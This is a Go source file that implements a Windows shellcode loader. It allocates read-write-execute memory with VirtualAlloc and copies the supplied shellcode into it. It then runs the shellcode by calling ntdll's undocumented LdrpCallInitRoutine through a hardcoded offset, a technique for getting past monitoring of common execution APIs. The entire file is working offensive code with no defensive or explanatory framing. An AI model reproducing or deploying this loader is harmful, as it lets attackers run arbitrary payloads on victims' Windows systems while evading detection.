package Loads

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT                  = 0x1000
	MEM_RESERVE                 = 0x2000
	PAGE_EXECUTE_READWRITE      = 0x40
	NULL                        = 0
	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	GetModuleHandleA  = kernel32.MustFindProc("GetModuleHandleA")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	_, _, _ = GetCurrentProcess.Call()

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	p1, _ := syscall.UTF16PtrFromString("ntdll")
	hNtdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(p1)))
	func1 := hNtdll + uintptr(NTDLL_LDRPCALLINITRT_OFFSET)
	func2 := (*func(p1 uintptr, p2 uintptr, p3 uintptr, p4 uintptr))(unsafe.Pointer(func1))
	LdrpCallInitRoutine := *func2
	LdrpCallInitRoutine(addr, 0, 0, 0)
}
